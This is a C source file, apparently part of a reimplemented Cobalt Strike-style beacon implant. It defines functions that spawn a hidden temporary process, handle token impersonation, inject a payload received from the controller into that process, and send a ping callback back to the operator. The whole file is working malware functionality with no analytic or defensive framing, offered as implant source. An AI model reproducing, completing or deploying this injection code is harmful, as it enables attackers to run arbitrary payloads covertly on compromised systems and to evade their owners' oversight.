#include "pch.h"

#include "spawn.h"
#include "beacon.h"
#include "identity.h"

void Spawn(char* data, int size, BOOL x86, BOOL ignoreToken)
{
	IdentityConditionalRevert(ignoreToken);

	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	PROCESS_INFORMATION pi = { 0 };

	/* get the startup information of the current process */
	GetStartupInfoA(&si);

	// Indicate the attributes of the process to be created.
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // means: use the following handles and show the window
	si.wShowWindow = SW_HIDE; // means: don't show the window

	// clear the standard input
	memset(&si.hStdInput, 0, sizeof(si.hStdInput));

	// Spawn a temporary process.
	if (BeaconSpawnTemporaryProcess(x86, ignoreToken, &si, &pi))
	{
		Sleep(100);

		// Inject the payload into the spawned process using InjectProcess.
		BeaconInjectTemporaryProcess(&pi, data, size, 0, NULL, 0);

		BeaconCleanupProcess(&pi);
	}

	IdentityConditionalImpersonate(ignoreToken);
}

void SpawnAndPing(char* data, int size, BOOL x86)
{
	datap parser;
	BeaconDataParse(&parser, data, size);
	short port = BeaconDataShort(&parser);
	CHAR* spawnData = BeaconDataBuffer(&parser);
	SIZE_T spawnSize = BeaconDataLength(&parser);

	Spawn(spawnData, spawnSize, x86, TRUE);

	port = htons(port);
	BeaconOutput(CALLBACK_PING, (char*)&port, sizeof(port));
}